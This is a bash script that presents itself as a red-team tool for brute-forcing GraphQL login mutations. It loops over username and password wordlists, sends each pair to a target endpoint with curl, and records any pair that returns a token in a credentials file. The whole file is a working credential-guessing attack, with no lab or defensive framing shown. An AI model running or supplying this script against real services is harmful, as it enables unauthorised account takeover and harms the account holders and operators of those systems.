#!/bin/bash

# graphql_brute_mutation.sh - GraphQL Mutation Brute-Forcer
# Author: Zane Anderson

# Colors
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
BLUE="\033[1;34m"
RESET="\033[0m"

# Banner
echo -e "${BLUE}"
echo "   ____                 _           _  __      __      _     _ _   "
echo "  / ___| ___   ___   __| | ___ _ __(_)/ _| ___ / _| ___| |__ (_| |_ "
echo " | |  _ / _ \ / _ \ / _\` |/ _ \ '__| | |_ / _ \ |_ / __| '_ \| | __|"
echo " | |_| | (_) | (_) | (_| |  __/ |  | |  _|  __/  _\\__ \ | | | | |_ "
echo "  \____|\___/ \___/ \__,_|\___|_|  |_|_|  \___|_| |___/_| |_|_|\__|"
echo "     GraphQL Red Team Toolkit - Mutation Brute-Forcer"
echo -e "${RESET}"

# Help
function usage() {
  echo -e "${YELLOW}Usage:${RESET} $0 -e <endpoint> u:<username>|-u <userlist> -w <wordlist>"
  exit 1
}

# Args
while [[ "$#" -gt 0 ]]; do
  case $1 in
    -e|--endpoint)
      ENDPOINT="$2"; shift 2;;
    u:*)
      FIXED_USER="${1#u:}"; shift;;
    -u)
      USERLIST="$2"; shift 2;;
    -w)
      PASSLIST="$2"; shift 2;;
    *)
      usage;;
  esac
done

if [[ -z "$ENDPOINT" || -z "$PASSLIST" || ( -z "$FIXED_USER" && -z "$USERLIST" ) ]]; then
  usage
fi

# Brute Function
function attempt_login() {
  local user=$1
  local pass=$2

  local query='{ "query": "mutation { login(username: \"'"$user"'\", password: \"'"$pass"'\") { token } }" }'

  response=$(curl -s -X POST "$ENDPOINT" -H "Content-Type: application/json" -d "$query")

  if echo "$response" | grep -q 'token'; then
    echo -e "${GREEN}[+] Valid Credentials:${RESET} $user:$pass"
    echo "$user:$pass" >> valid_creds.txt
  elif echo "$response" | grep -q 'errors'; then
    echo -e "${RED}[-] Failed:${RESET} $user:$pass"
  else
    echo -e "${YELLOW}[!] Unexpected response for:${RESET} $user:$pass"
  fi
}

# Begin Brute
if [[ -n "$FIXED_USER" ]]; then
  while read -r pass; do
    attempt_login "$FIXED_USER" "$pass"
  done < "$PASSLIST"
elif [[ -n "$USERLIST" ]]; then
  while read -r user; do
    while read -r pass; do
      attempt_login "$user" "$pass"
    done < "$PASSLIST"
  done < "$USERLIST"
fi

echo -e "\n${YELLOW}[>] Brute-force complete. Results saved to valid_creds.txt${RESET}"
